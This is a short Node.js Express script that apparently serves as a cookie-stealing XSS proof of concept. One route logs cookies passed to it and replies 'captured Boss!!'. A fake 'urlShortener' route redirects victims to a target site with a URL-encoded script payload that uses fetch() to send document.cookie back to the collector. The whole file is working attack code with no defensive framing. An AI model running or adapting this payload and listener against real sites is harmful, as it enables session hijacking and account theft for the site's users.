let express = require('express');
let app = express();

app.get('/cookie', (req, res, next) => {
	console.log(req.query.cookie);
	res.send({"kickraju":"captured Boss!!"});
})

app.get('/urlShortener', (req, res, next) => {
	res.redirect(`https://domain?queryparam=random%3cscript%3efetch('http://localhost:3000/cookie?cookie='%2Bdocument.cookie)%3c%2fscript%3ec6q0j&groupDesc=PMs`);
})

app.listen(3000);